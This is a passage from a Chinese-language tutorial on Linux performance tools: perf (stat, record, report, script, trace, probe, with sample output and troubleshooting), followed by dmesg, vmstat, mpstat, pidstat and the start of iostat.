raw_syscalls:sys_enter -I 1000 -a # 按类型计算指定PID的系统调用，直到Ctrl-C结束 perf stat -e 'syscalls:sys_enter_*' -p \u0026lt;PID\u0026gt; # 按类型统计整个系统范围内的系统调用，持续 5 秒： perf stat -e 'syscalls:sys_enter_*' -a sleep 5 # 按类型计数整个系统的系统调用，持续5秒: perf stat -e 'syscalls:sys_enter_*' -a sleep 5 # 记录指定PID进程的调度器事件直到Ctrl-C结束 perf stat -e 'sched:*' -p PID # 记录指定PID进程的调度器事件，持续10s perf stat -e 'sched:*' -p PID sleep 10 # 记录整个系统内的ext4事件，持续10s perf stat -e 'ext4:*' -a sleep 10 # 统计整个系统的块设备 I/O 事件，持续10s perf stat -e 'block:*' -a sleep 10 # 统计所有 vmscan 事件，每秒打印一份报告： perf stat -e 'vmscan:*' -a -I 1000 record - 将CPU事件记录到文件 导出事件记录到文件\nperf的子命令 record 是可以将事件记录到 perf.data，例如要CPU周期事件，可以使用record子命令并通过 tag -e 来指定事件名称\n# 通过perf list 可以看出 CPU周期事件为 cpu-cycles OR cycles perf record -e cycles sleep 10 通过查看文件的记录\n结果将保存到 perf.data 文件中，如果需要查看 perf.data 需要使用子命令 report 查看，report 子命令默认查找当前目录下的 perf.data 文件，如果需要指定特定目录的需要使用tag -i\nperf report -i ./perf.data 修改样本文件输出的结果格式\nreport 子命令也可以改变要显示的结果样式，例如想输出为标准输出，可以使用 --stdio\n$ perf report --stdio # To display the perf.data header info, please use --header/--header-only options. # # # Total Lost Samples: 0 # # Samples: 18 of event 'cycles' # Event count (approx.): 440 # # Overhead Command Shared Object Symbol # ........ ....... ................. .................... # 90.91% sleep [kernel.kallsyms] [k] native_write_msr 9.09% perf_5. [kernel.kallsyms] [k] native_write_msr # # (Tip: Order by the overhead of source file name and line number: perf report -s srcline) # 如果想显示事件的编号以及对特定列排序可以使用下面域名\n$ perf report -n --sort comm,symbol --stdio # To display the perf.data header info, please use --header/--header-only options. # # # Total Lost Samples: 0 # # Samples: 18 of event 'cycles' # Event count (approx.): 440 # # Overhead Samples Command Symbol IPC [IPC Coverage] # ........ ............ ....... .................... .................... # 90.91% 9 sleep [k] native_write_msr - - 9.09% 9 perf_5. [k] native_write_msr - - # # (Tip: Show current config key-value pairs: perf config --list) # script - trace做了什么 perf 子命令 script 可以trace perf.data 中所有的事件；例如上面的 perf.data 最终两个事件展开为\nperf script 子命令也是作为一个后期处理数据的一个命令\n$ perf script perf_5.10 2730 28762.537401: 1 cycles: ffffffffbd46b466 native_write_msr+0x6 ([kernel.kallsyms]) perf_5.10 2730 28762.537540: 1 cycles: ffffffffbd46b466 native_write_msr+0x6 ([kernel.kallsyms]) perf_5.10 2730 28762.537670: 1 cycles: ffffffffbd46b466 native_write_msr+0x6 ([kernel.kallsyms]) perf_5.10 2730 28762.537798: 2 cycles: ffffffffbd46b466 native_write_msr+0x6 ([kernel.kallsyms]) perf_5.10 2730 28762.537901: 3 cycles: ffffffffbd46b466 native_write_msr+0x6 ([kernel.kallsyms]) perf_5.10 2730 28762.538003: 4 cycles: ffffffffbd46b466 native_write_msr+0x6 ([kernel.kallsyms]) perf_5.10 2730 28762.538105: 6 cycles: ffffffffbd46b466 native_write_msr+0x6 ([kernel.kallsyms]) perf_5.10 2730 28762.538207: 9 cycles: ffffffffbd46b466 native_write_msr+0x6 ([kernel.kallsyms]) perf_5.10 2730 28762.538320: 13 cycles: ffffffffbd46b466 native_write_msr+0x6 ([kernel.kallsyms]) sleep 2730 28772.542839: 26 cycles: ffffffffbd46b466 native_write_msr+0x6 ([kernel.kallsyms]) sleep 2730 28772.543041: 26 cycles: ffffffffbd46b466 native_write_msr+0x6 ([kernel.kallsyms]) sleep 2730 28772.543233: 26 cycles: ffffffffbd46b466 native_write_msr+0x6 ([kernel.kallsyms]) sleep 2730 28772.543421: 30 cycles: ffffffffbd46b466 native_write_msr+0x6 ([kernel.kallsyms]) sleep 2730 28772.543558: 35 cycles: ffffffffbd46b466 native_write_msr+0x6 ([kernel.kallsyms]) sleep 2730 28772.543683: 41 cycles: ffffffffbd46b466 native_write_msr+0x6 ([kernel.kallsyms]) sleep 2730 28772.543806: 53 cycles: ffffffffbd46b466 native_write_msr+0x6 ([kernel.kallsyms]) sleep 2730 28772.543929: 70 cycles: ffffffffbd46b466 native_write_msr+0x6 ([kernel.kallsyms]) sleep 2730 28772.544065: 93 cycles: ffffffffbd46b466 native_write_msr+0x6 ([kernel.kallsyms]) 输出显示文件的头信息，例如跟踪何时开始、持续了多长时间、CPU信息以及获取数据的命令。 事件列表在头信息之后。\n显示trace的头信息\n使用tag --header 可以显示文件的头信息，例如跟何时开始trace、持续的事件、CPU信息以及获取数据的命令。 事件列表在头信息之后。事件头信息是由 # ======== 包含著的信息\n# ======== # captured on : Tue Dec 6 04:44:38 2022 # header version : 1 # data offset : 256 # data size : 11528 # feat offset : 11784 # hostname : debian-template # os release : 5.10.0-16-amd64 # perf version : 5.10.149 # arch : x86_64 # nrcpus online : 2 # nrcpus avail : 2 # cpudesc : AMD Ryzen 7 5800U with Radeon Graphics # cpuid : AuthenticAMD,25,80,0 # total memory : 1996352 kB # cmdline : /usr/bin/perf_5.10 record -e cycles sleep 10 # event : name = cycles, , id = { 471, 472 }, size = 120, { sample_period, sample_freq } = 2250, sample_type = IP|TID|TIME|PERIOD, read_forma\u0026gt; # CPU_TOPOLOGY info available, use -I to display # NUMA_TOPOLOGY info available, use -I to display # pmu mappings: software = 1, power = 9, uprobe = 7, cpu = 4, breakpoint = 5, tracepoint = 2, kprobe = 6, msr = 8 # CACHE info available, use -I to display # time of first sample : 28762.537401 # time of last sample : 28772.544065 # sample duration : 10006.663 ms # MEM_TOPOLOGY info available, use -I to display # bpf_prog_info 3: bpf_prog_47dd357395126b0c addr 0xffffffffc00eb59c size 309 # bpf_prog_info 4: bpf_prog_6deef7357e7b4530 addr 0xffffffffc00f2168 size 54 # bpf_prog_info 5: bpf_prog_6deef7357e7b4530 addr 0xffffffffc00f40e0 size 54 # bpf_prog_info 6: bpf_prog_b73cbcf8b8c71a5b addr 0xffffffffc02591c8 size 307 # bpf_prog_info 7: bpf_prog_6deef7357e7b4530 addr 0xffffffffc025b584 size 54 # bpf_prog_info 8: bpf_prog_6deef7357e7b4530 addr 0xffffffffc025db10 size 54 # bpf_prog_info 9: bpf_prog_ee0e253c78993a24 addr 0xffffffffc0534640 size 255 # bpf_prog_info 10: bpf_prog_ce28cc67158d681f addr 0xffffffffc04947f0 size 447 # bpf_prog_info 11: bpf_prog_6deef7357e7b4530 addr 0xffffffffc052fe4c size 54 # bpf_prog_info 12: bpf_prog_6deef7357e7b4530 addr 0xffffffffc0531224 size 54 # cpu pmu capabilities: max_precise=0 # missing features: TRACING_DATA BRANCH_STACK GROUP_DESC AUXTRACE STAT CLOCKID DIR_FORMAT COMPRESSED CLOCK_DATA # ======== 导出16进制的原生数据\n导出原生数据是ASIIC格式事件信息\n$ perf script -D 0x100 [0x50]: event: 1 . . ... raw event: size 80 bytes . 0000: 01 00 00 00 01 00 50 00 ff ff ff ff 00 00 00 00 ......P......... . 0010: 00 00 40 bd ff ff ff ff f7 1d c0 00 00 00 00 00 ..@............. . 0020: 00 00 40 bd ff ff ff ff 5b 6b 65 72 6e 65 6c 2e ..@.....[kernel. . 0030: 6b 61 6c 6c 73 79 6d 73 5d 5f 74 65 78 74 00 00 kallsyms]_text.. . 0040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0 0x100 [0x50]: PERF_RECORD_MMAP -1/0: [0xffffffffbd400000(0xc01df7) @ 0xffffffffbd400000]: x [kernel.kallsyms]_text 0x150 [0x78]: event: 1 . . ... raw event: size 120 bytes . 0000: 01 00 00 00 01 00 78 00 ff ff ff ff 00 00 00 00 ......x......... . 0010: 00 10 0a c0 ff ff ff ff 00 00 04 00 00 00 00 00 ................ . 0020: 00 00 00 00 00 00 00 00 2f 6c 69 62 2f 6d 6f 64 ......../lib/mod . 0030: 75 6c 65 73 2f 35 2e 31 30 2e 30 2d 31 36 2d 61 ules/5.10.0-16-a . 0040: 6d 64 36 34 2f 6b 65 72 6e 65 6c 2f 64 72 69 76 md64/kernel/driv . 0050: 65 72 73 2f 73 63 73 69 2f 73 63 73 69 5f 6d 6f ers/scsi/scsi_mo . 0060: 64 2e 6b 6f 00 00 00 00 00 00 00 00 00 00 00 00 d.ko............ . 0070: 00 00 00 00 00 00 00 00 trace - 更高性能的strace的替代品 trace是linux 3.7 增加的功能，可以用作strace命令的替代品，因为不需要用户-内核空间切换，所以性能将更快\nperf trace \u0026lt;command\u0026gt; 也可以使用tag -e 来指定仅对指定事件trace\nperf trace -e read,write \u0026lt;command\u0026gt; 可以看到对应事件将只有 read 与 write\n$ perf trace -e read,write ls 0.000 (1\tnginx-1.22.0\tnginx_1.22.0.orig.tar.gz\tperf.data 1.c\tnginx_1.22.0-1.debian.tar.xz nginx-1.22.0.tar.gz\tperf.data.old deb-multimedia-keyring_2016.8.1_all.deb nginx_1.22.0-1.dsc\tpaping_1.5.5_x86-64_linux.tar.gz 0.058 ms): ls/3126 read(fd: 3, buf: 0x7ffcd2548068, count: 832) = 832 0.132 ( 0.034 ms): ls/3126 read(fd: 3, buf: 0x7ffcd2548048, count: 832) = 832 0.232 ( 0.033 ms): ls/3126 read(fd: 3, buf: 0x7ffcd2548028, count: 832) = 832 0.324 ( 0.032 ms): ls/3126 read(fd: 3, buf: 0x7ffcd2548008, count: 832) = 832 0.416 ( 0.032 ms): ls/3126 read(fd: 3, buf: 0x7ffcd2547fc8, count: 832) = 832 0.828 ( 0.048 ms): ls/3126 read(fd: 3, buf: 0x55c4bb555500, count: 1024) = 361 0.907 ( 0.028 ms): ls/3126 read(fd: 3, buf: 0x55c4bb555500, count: 1024) = 0 1.127 ( 0.060 ms): ls/3126 write(fd: 1, buf: 0x55c4bb555500, count: 65) = 65 1.219 ( 0.385 ms): ls/3126 write(fd: 1, buf: 0x55c4bb555500, count: 75) = 75 1.638 ( 0.049 ms): ls/3126 write(fd: 1, buf: 0x55c4bb555500, count: 100) = 100 probe - 动态追踪 perf probe子命令是可以动态的在linux内核中自定义追踪事件（追踪点），追踪点的运行时可以在被放置任何任何地方，并且每次通过该追踪点时，都可以记录其值。\n如何使用 perf probe？\n查看可探测的函数\nperf probe -F 可以找到可用的追踪点，如果模糊查找可以使用filter\nperf probe -F -–filter dev*xmit* probe参数\nOption describe -L 显示源代码 -x 可执行文件的名称或路径 -l 列出所有probe探测事件 -k 指定vmlinux文件 -a **`\u0026lt;[EVENT=]FUNC[@SRC][+OFF EVENT 事件名称 FUNC 函数名 +OFF 函数入口的偏移量 %return 探针位置为函数返回处 SRC 源代码路径 RL 相对函数入口处的行号 AL 在文件内的绝对行号 ARG: 探测参数（局部变量名 或 kprobe-tracer 参数格式。 perf probe -x tst --add 'out=func%return $retval' perf record -g -e probe_tst:out -aR ./tst 一些使用示例\n# 添加一个追踪点到linux内核函数tcp_sendmsg()至入口 perf probe --add tcp_sendmsg # 删除linux内核tcp_sendmsg()函数上的追踪点 perf probe -d tcp_sendmsg # 列出现有的追踪点 perf probe -l # 添加一个追踪点到linux内核函数tcp_sendmsg()返回部分 perf probe 'tcp_sendmsg%return' 通过probe检测内核函数 probe使用示例说明\n内核函数：tcp_sendmsg() 在内核函数上 tcp_sendmsg 添加一个事件\nperf probe --add tcp_sendmsg 此时会存在一个追踪点，通过 perf probe -l 可以查看\ntrace此追踪点5s，记录堆栈信息\nperf record -e probe:tcp_sendmsg -a -g -- sleep 5 通过 report 子命令可以查看对应信息\n$ perf report --stdio -i perf.data # To display the perf.data header info, please use --header/--header-only options. # # # Total Lost Samples: 0 # # Samples: 13 of event 'probe:tcp_sendmsg' # Event count (approx.): 13 # # Children Self Command Shared Object Symbol # ........ ........ ....... ................ .................................. # 100.00% 100.00% sshd [kernel.vmlinux] [k] tcp_sendmsg | |--92.31%--0 | getnetbyaddr_r@@GLIBC_2.2.5 | entry_SYSCALL_64_after_hwframe | do_syscall_64 | ksys_write | vfs_write | new_sync_write | sock_write_iter | sock_sendmsg | tcp_sendmsg | --7.69%--0x1b81475c085 getnetbyaddr_r@@GLIBC_2.2.5 entry_SYSCALL_64_after_hwframe do_syscall_64 ksys_write vfs_write new_sync_write sock_write_iter sock_sendmsg tcp_sendmsg 100.00% 0.00% sshd libc-2.31.so [.] getnetbyaddr_r@@GLIBC_2.2.5 | ---getnetbyaddr_r@@GLIBC_2.2.5 entry_SYSCALL_64_after_hwframe 删除对应跟踪点\nperf probe -d \u0026lt;probe_name\u0026gt; 也可以通过内核函数的变量进行检查\n查看内核函数参数，可以看到存在三个参数 size int类型, msg 结构体指针，sk 结构体指针\n$ perf probe -V tcp_sendmsg Available variables at tcp_sendmsg @\u0026lt;tcp_sendmsg+0\u0026gt; size_t size struct msghdr* msg struct sock* sk 使用 size 变量作为 tcp_sendmsg 探测点的探测器\nperf probe --add 'tcp_sendmsg size' 通过probe检测用户空间程序 [2] 准备一段代码，即每次循环，打印该值并打印该值+5\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int func(int xxx) { int zzz = xxx; printf(\u0026quot;zzz: %d\\n\u0026quot;, zzz); return zzz+5; } int main(int argc, char* argv[]) { int i=0; for( i=0; i\u0026lt;10; i++) printf(\u0026quot;yyy: %d\\n\u0026quot;, func(argc + i)); return 0; } 这里使用环境为 debian11，内核 5.10，需要注意的是，在新内核中版本中传参的命令与老内核有少许差别\n运行编译后的程序可以看到结果\n$ gcc -g -o tst tst.c \u0026amp;\u0026amp; ./tst zzz: 1 yyy: 6 zzz: 2 yyy: 7 zzz: 3 yyy: 8 zzz: 4 yyy: 9 zzz: 5 yyy: 10 zzz: 6 yyy: 11 zzz: 7 yyy: 12 zzz: 8 yyy: 13 zzz: 9 yyy: 14 zzz: 10 yyy: 15 这里编译时使用了 -g 选项，-g 是一个编译选项，即在源代码编译的过程中起作用，让gcc把更多调试信息（也就包括符号信息）收集起来并将存放到最终的可执行文件\n接下来为程序创建一个追踪事件，\nperf probe -x tst --add 'out=func%return $retval' # 格式将严格遵循 \u0026lt;[EVENT=]FUNC[@SRC][+OFF|%return|:RL|;PT]|SRC:AL|SRC;PT [[NAME=]ARG ...]\u0026gt; # out=func%return %retval # EVENT=FUNC%return ARG # EVENT 探测事件名 # FUNC 函数名 # %return 在函数return处放置探针 # ARG 参数 此时可以执行这个程序，让probe可以追踪到数据\n$ perf record -g -e probe_tst:out__return -aR ./tst Lowering default frequency rate to 2750. Please consider tweaking /proc/sys/kernel/perf_event_max_sample_rate. zzz: 1 yyy: 6 zzz: 2 yyy: 7 zzz: 3 yyy: 8 zzz: 4 yyy: 9 zzz: 5 yyy: 10 zzz: 6 yyy: 11 zzz: 7 yyy: 12 zzz: 8 yyy: 13 zzz: 9 yyy: 14 zzz: 10 yyy: 15 [ perf record: Woken up 1 times to write data ] [ perf record: Captured and wrote 0.163 MB perf.data (10 samples) ] 执行的结果保存在 perf.data 中\n$ perf report --stdio # To display the perf.data header info, please use --header/--header-only options. # # # Total Lost Samples: 0 # # Samples: 10 of event 'probe_tst:out__return' # Event count (approx.): 10 # # Children Self Command Shared Object Symbol # ........ ........ ....... ................ ...................... # 100.00% 100.00% tst tst [.] main | ---0x5541d68949564100 cancel_handler main 100.00% 0.00% tst [unknown] [.] 0x5541d68949564100 | ---0x5541d68949564100 cancel_handler main 100.00% 0.00% tst libc-2.31.so [.] cancel_handler | ---cancel_handler main 使用 script 子命令查看这个程序的trace记录，可以看到\nperf script tst 2272 [000] 28276.947273: probe_tst:out__return: (55dc41f11135 \u0026lt;- 55dc41f11192) arg1=0x6 55dc41f11192 main+0x2e (/root/tst) 7f67337bed0a cancel_handler+0x3a (/usr/lib/x86_64-linux-gnu/libc-2.31.so) 5541d68949564100 [unknown] ([unknown]) tst 2272 [000] 28276.947282: probe_tst:out__return: (55dc41f11135 \u0026lt;- 55dc41f11192) arg1=0x7 55dc41f11192 main+0x2e (/root/tst) 7f67337bed0a cancel_handler+0x3a (/usr/lib/x86_64-linux-gnu/libc-2.31.so) 5541d68949564100 [unknown] ([unknown]) tst 2272 [000] 28276.947288: probe_tst:out__return: (55dc41f11135 \u0026lt;- 55dc41f11192) arg1=0x8 55dc41f11192 main+0x2e (/root/tst) 7f67337bed0a cancel_handler+0x3a (/usr/lib/x86_64-linux-gnu/libc-2.31.so) 5541d68949564100 [unknown] ([unknown]) tst 2272 [000] 28276.947294: probe_tst:out__return: (55dc41f11135 \u0026lt;- 55dc41f11192) arg1=0x9 55dc41f11192 main+0x2e (/root/tst) 7f67337bed0a cancel_handler+0x3a (/usr/lib/x86_64-linux-gnu/libc-2.31.so) 5541d68949564100 [unknown] ([unknown]) tst 2272 [000] 28276.947300: probe_tst:out__return: (55dc41f11135 \u0026lt;- 55dc41f11192) arg1=0xa 55dc41f11192 main+0x2e (/root/tst) 7f67337bed0a cancel_handler+0x3a (/usr/lib/x86_64-linux-gnu/libc-2.31.so) 5541d68949564100 [unknown] ([unknown]) tst 2272 [000] 28276.947306: probe_tst:out__return: (55dc41f11135 \u0026lt;- 55dc41f11192) arg1=0xb 55dc41f11192 main+0x2e (/root/tst) 7f67337bed0a cancel_handler+0x3a (/usr/lib/x86_64-linux-gnu/libc-2.31.so) 5541d68949564100 [unknown] ([unknown]) tst 2272 [000] 28276.947311: probe_tst:out__return: (55dc41f11135 \u0026lt;- 55dc41f11192) arg1=0xc 55dc41f11192 main+0x2e (/root/tst) 7f67337bed0a cancel_handler+0x3a (/usr/lib/x86_64-linux-gnu/libc-2.31.so) 5541d68949564100 [unknown] ([unknown]) tst 2272 [000] 28276.947317: probe_tst:out__return: (55dc41f11135 \u0026lt;- 55dc41f11192) arg1=0xd 55dc41f11192 main+0x2e (/root/tst) 7f67337bed0a cancel_handler+0x3a (/usr/lib/x86_64-linux-gnu/libc-2.31.so) 5541d68949564100 [unknown] ([unknown]) tst 2272 [000] 28276.947322: probe_tst:out__return: (55dc41f11135 \u0026lt;- 55dc41f11192) arg1=0xe # 14 55dc41f11192 main+0x2e (/root/tst) 7f67337bed0a cancel_handler+0x3a (/usr/lib/x86_64-linux-gnu/libc-2.31.so) 5541d68949564100 [unknown] ([unknown]) tst 2272 [000] 28276.947328: probe_tst:out__return: (55dc41f11135 \u0026lt;- 55dc41f11192) arg1=0xf # 15 55dc41f11192 main+0x2e (/root/tst) 7f67337bed0a cancel_handler+0x3a (/usr/lib/x86_64-linux-gnu/libc-2.31.so) 5541d68949564100 [unknown] ([unknown]) 可以通过上面看到，这里制作的探针在用户空间程序 tst.func 函数中，当他返回时，记录了要返回的值作为arg1，也就是每行返回的 0xf 这类16进制值，也可以看到每次命中该探针的部分\nTroubleshooting Uhhuh. NMI received for unknown reason Message from syslogd@phab1 at Dec 26 19:16:16 ... kernel:Uhhuh. NMI received for unknown reason 30 on CPU 0. Message from syslogd@phab1 at Dec 26 19:16:16 ... kernel:Do you have a strange power saving mode enabled? Message from syslogd@phab1 at Dec 26 19:16:16 ... kernel:Dazed and confused, but trying to continue 上述问题通常发生于虚拟化环境\nSolve solution: disable c-state in bios\nFailed to find the path for kernel: Invalid ELF file Failed to find the path for kernel: Invalid ELF file Error: Failed to show vars. 这个错误通常使用 perf probe -V 时出现，这里需要内核支持 debug symbols，即使用公开发行版需要安装对应内核包\nRHEL/CentOS：安装 kernel-debuginfo-common 与 kernel-debuginfo package Debian/Ubuntu：安装 linux-image-\u0026lt;kernel_version\u0026gt;-amd64-dbg debian下保持需要至少5G空间 [3] Failed to find source file path $ perf probe -L tcp_sendmsg Failed to find source file path. Error: Failed to show lines. 思路：可以通过 strace 命令看看为什么报错\n原因：perf probe -L 将显示对应内核探测点的源代码，此时perf会寻找构建的内核目录，而操作系统发行版供应商对于系统都是通过包管理，包括内核，并未提供这些源码，此状态为正确的，如果非要解决，可以自行编译内核。\ndmesg dmesg 是来自内核的一个环形缓冲区，而通过 dmesg 命令可以看到来自该缓冲区的消息，而该消息也被称为 ”driver message“ 或 ”display message“\n示例1：对dmesg输出着色 $ dmesg -L 示例2：dmesg输出消息增加时间 $ dmesg -T 示例3：过滤相关级别信息 可以通过 --level 来进行过滤出不同级别的日志，可用级别有\nemerg, alert, crit, err, warn, notice, info debug $ dmesg --level=err $ dmesg --level=warn 示例4：过滤相关事件信息 dmesg 可以通过参数指定 --facility 来指定对应事件的日志，可用的设施有：\nkern user mail daemon auth lpr news $ dmesg --facility=daemon [ 1.793879] systemd[1]: Inserted module 'autofs4' [ 1.807871] systemd[1]: systemd 247.3-7 running in system mode. (+PAM +AUDIT +SELINUX +IMA +APPARMOR +SMACK +SYSVINIT +UTMP +LIBCRYPTSETUP +GCRYPT +GNUTLS +ACL +XZ +LZ4 +ZSTD +SECCOMP +BLKID +ELFUTILS +KMOD +IDN2 -IDN +PCRE2 default-hierarchy=unified) [ 1.807925] systemd[1]: Detected virtualization vmware. [ 1.807927] systemd[1]: Detected architecture x86-64. [ 1.808612] systemd[1]: Set hostname to \u0026lt;debian-template\u0026gt;. [ 1.881058] systemd[1]: Queued start job for default target Graphical Interface. [ 1.882132] systemd[1]: Created slice system-getty.slice. [ 1.882337] systemd[1]: Created slice system-modprobe.slice. [ 1.882724] systemd[1]: Created slice system-systemd\\x2dfsck.slice. [ 1.882869] systemd[1]: Created slice User and Session Slice. [ 1.882902] systemd[1]: Started Dispatch Password Requests to Console Directory Watch. [ 1.882920] systemd[1]: Started Forward Password Requests to Wall Directory Watch. [ 1.883019] systemd[1]: Set up automount Arbitrary Executable File Formats File System Automount Point. [ 1.883036] systemd[1]: Reached target Local Encrypted Volumes. [ 1.883049] systemd[1]: Reached target Paths. [ 1.883054] systemd[1]: Reached target Remote File Systems. [ 1.883058] systemd[1]: Reached target Slices. [ 1.883080] systemd[1]: Reached target Swap. [ 1.883152] systemd[1]: Listening on Syslog Socket. [ 1.883193] systemd[1]: Listening on fsck to fsckd communication Socket. [ 1.883218] systemd[1]: Listening on initctl Compatibility Named Pipe. [ 1.883285] systemd[1]: Listening on Journal Audit Socket. [ 1.883322] systemd[1]: Listening on Journal Socket (/dev/log). [ 1.883364] systemd[1]: Listening on Journal Socket. [ 1.883422] systemd[1]: Listening on udev Control Socket. [ 1.883456] systemd[1]: Listening on udev Kernel Socket. [ 1.883961] systemd[1]: Mounting Huge Pages File System... 示例5：实时打印dmesg日志 $ dmesg --follow 示例6：显示dmesg原生信息 $ dmesg -r 示例7：dmesg信息重定向到syslog dmesg本身只是一个用户空间命令，而 ”driver message“ 是内存中一个缓冲器，在Linux标识为 /dev/kmsg，而这个缓冲区是存在与内存中，如果需要将其重定向到syslog，可以通过参数 -S 实现，-s 则是设置这个环形buffer的大小\n示例8：过滤硬件设备相关信息 # usb设备 $ dmesg | grep -i usb # 还可以通过grep查看其它硬件设备相关信息 $ dmesg | grep -i dma $ dmesg | grep -i scsi $ dmesg | grep -i acpi $ dmesg | grep -i memory $ dmesg | grep -i tty $ dmesg | grep sda 示例9：清空buffer # 直接清空 dmesg -C # 读取并清空 dmesg -c vmstat vmstat 命令是Linux虚拟内存统计信息的命令，带来的是与进程有关的信息，如processes, memory, paging, block IO\n没有任何参数的vmstat\n$ vmstat procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu----- r b swpd free buff cache si so bi bo in cs us sy id wa st 1 0 0 1246808 24308 507656 0 0 5 0 60 130 0 0 100 0 0 vmstat输出包含的字段\nProcs – r: 等待运行的数量 Procs – b: 忙碌进程的数量 Memory – swpd: 已使用的虚拟内存 Memory – free: 空闲的虚拟内存 Memory – buff: 用作buffer的内存 Memory – cache: 用作cache的内存 Swap – si: 从磁盘交换至内存 (for every second) Swap – so: 内存交换到磁盘 (for every second) IO – bi (Blocks in). i.e 从设备接受到的块(for every second) IO – bo (Blocks out). i.e 发送到设备的块 (for every second) System – in (Interrupts per second) 每秒的中断 System – cs (Context switches) 上下文切换 CPU – us, sy, id, wa, st: CPU user time, system time, idle time, wait time 示例1：显示活动和非活动内存 $ vmstat -a procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu----- r b swpd free inact active si so bi bo in cs us sy id wa st 1 0 0 1247060 294352 314540 0 0 5 0 60 130 0 0 100 0 0 示例2：显示启动系统后所有fork系统调用 显示所有 fork、vfork 和 clone 系统调用计数\n$ vmstat -f 2889 forks 示例3：动态展示 展示结果将以 x 秒刷新，直到 crtl - c 退出\n$ vmstat 2 也可以接俩个参数，一个是刷新时间，一个是刷新多少次，例如，2秒刷新一次，一共刷新10次，完成后退出命令\n$ vmstat 2 10 示例4：打印时间 $ vmstat -t 1 2 procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu----- -----timestamp----- r b swpd free buff cache si so bi bo in cs us sy id wa st PST 1 0 0 1247424 24396 507656 0 0 5 0 60 130 0 0 100 0 0 2022-12-10 08:10:03 1 0 0 1247416 24396 507656 0 0 0 8 130 277 0 0 100 0 0 2022-12-10 08:10:04 示例5：显示slab相关信息 slab是一种内存管理机制，目的是为了更有效的分配内存对象\nvmstat -m Cache Num Total Size Pages nf_conntrack 102 102 320 51 ovl_inode 94 94 688 47 ext4_groupinfo_1k 120 120 136 60 fuse_request 0 0 152 53 fuse_inode 0 0 832 39 ext4_groupinfo_4k 112 112 144 56 ext4_fc_dentry_update 0 0 80 51 ext4_inode_cache 13554 13554 1184 27 ext4_system_zone 204 204 40 102 ext4_io_end 128 128 64 64 ext4_extent_status 3060 3060 40 102 jbd2_journal_handle 146 146 56 73 ... 场景6：输出格式为表格形式 $ vmstat -s 1996352 K total memory 216852 K used memory 314636 K active memory 294352 K inactive memory 1247416 K free memory 24428 K buffer memory 507656 K swap cache 0 K total swap 0 K used swap 0 K free swap 3635 non-nice user cpu ticks 2 nice user cpu ticks 8204 system cpu ticks 9759423 idle cpu ticks 310 IO-wait cpu ticks 0 IRQ cpu ticks 320 softirq cpu ticks 0 stolen cpu ticks 498371 pages paged in 45598 pages paged out 0 pages swapped in 0 pages swapped out 5866212 interrupts 12709713 CPU context switches 1670639441 boot time 2922 forks 场景7：磁盘相关信息 $ vmstat -d 1 20 disk- ------------reads------------ ------------writes----------- -----IO------ total merged sectors ms total merged sectors ms cur sec sda 7835 2737 996742 2134 5719 2598 91620 6219 0 9 sda 7835 2737 996742 2134 5747 2598 91908 6230 0 9 场景8：输出格式增加宽度 vmstat -w 1 3 --procs-- -----------------------memory---------------------- ---swap-- -----io---- -system-- --------cpu-------- r b swpd free buff cache si so bi bo in cs us sy id wa st 0 0 0 1247440 24468 507656 0 0 5 0 60 130 0 0 100 0 0 0 0 0 1247440 24468 507656 0 0 0 0 135 265 0 0 100 0 0 0 0 0 1247440 24468 507656 0 0 0 0 126 262 0 0 100 0 0 场景9：输出单位格式化 vmstat -S k vmstat: -S requires k, K, m or M (default is KiB) mpstat mpstat是统计CPU相关信息的命令\n各系统下的包名与安装\nUbuntu/Debian/Mint：apt install sysstat -y RHEL/CentOS/Fedora：yum install -y sysstat $ mpstat 08:22:07 AM CPU %usr %nice %sys %iowait %irq %soft %steal %guest %gnice %idle 08:22:07 AM all 0.04 0.00 0.09 0.00 0.00 0.00 0.00 0.00 0.00 99.87 看懂 mpstat 输出结果\nCPU：处理器编号. all为所有CPU在一段时间内的平均统计信息. %usr：在用户级别（应用程序）执行时的CPU平均使用率。 %nice：具有良好级别的用户级别（应用程序）执行时的CPU平均使用率。 %sys：显示在内核级别执行时发生的CPU使用率。 这里不包括耗时的硬/软中断服务 %iowait：CPU 或 CPU 处于空闲状态期间系统有未完成的磁盘 I/O 请求。 %irq：一个或多个 CPU 在中断时，硬中断所花费的时间的百分比。 %soft： 一个或多个CPU用于中断时，软中断所花费的时间百分比。 %steal： 一个或多个虚拟CPU当在虚拟机管理器服务与另一个虚拟处理器时非自愿等待时间所花费的百分比 %guest：一个或多个CPU在运行一个虚拟处理器使用时间的百分比 %idle : 一个或多个CPU处于idle状态，并且系统没有尚未完成的磁盘 I/O 请求 # 显示所有信息 mpstat -A # 按照独立核心展示 mpstat -P ALL # 使用编号指定单独的CPU编号 mpstat -P 1 # 第一个参数表示刷新时间，第二个参数表示刷新次数 mpstat 2 10 # CPU利用率 mpstat -u %usr # CPU中断信息 mpstat -I { SUM | CPU | SCPU | ALL } pidstat pidstat 是 sysstat 包的一部分，可以统计单个进程并生成报告。用以通过 PID 来评估资源的使用率\n各系统下的包名与安装\nUbuntu/Debian/Mint：apt install sysstat -y RHEL/CentOS/Fedora：yum install -y sysstat # 显示所有进程 pidstat -p ALL # 查看特定进程 pidstat -p 514 # 根据进程名称来查看 pidstat -C \u0026quot;mysql\u0026quot; # 指定实时刷新 pidstat -p 23493 1 # 显示指定进程的I/O统计信息 pidstat -p \u0026lt;pid\u0026gt; -d # 显示指定进程的活动分页统计信息 pidstat -p \u0026lt;pid\u0026gt; -r # 显示结果时加上进程程序所在路径、参数等信息 pidstat -C java -l # 第一个参数表示刷新时间，第二个参数表示刷新次数 pidstat 2 5 # 显示进程的子进程信息 # -T: CHILD, or TASKS, or ALL. pidstat -p 1 -T CHILD # 显示为依赖进程树格式 pidstat -t -C \u0026quot;ssh\u0026quot; # 展示一个水平线上的性能 # option “r” page faults and memory utilization # option “d” I/O statistics # option “u” CPU utilization # 展示结果将按照 r d u 依次输出 pidstat -rud iostat iostat 是 sysstat 包的一部分，可以通过命令来统计CPU使用率, I/O, （设备，分区）, 网络文件系统等\n各系统下的包名与安装\nUbuntu/Debian/Mint：apt install sysstat -y RHEL/CentOS/Fedora：yum install -y sysstat iostat命令参数\n-c: 显示CPU使用率 -d: 显示设备使用率 -k: 以kb为单位统计（每秒） -m: 以mb为单位统计（每秒） -x: 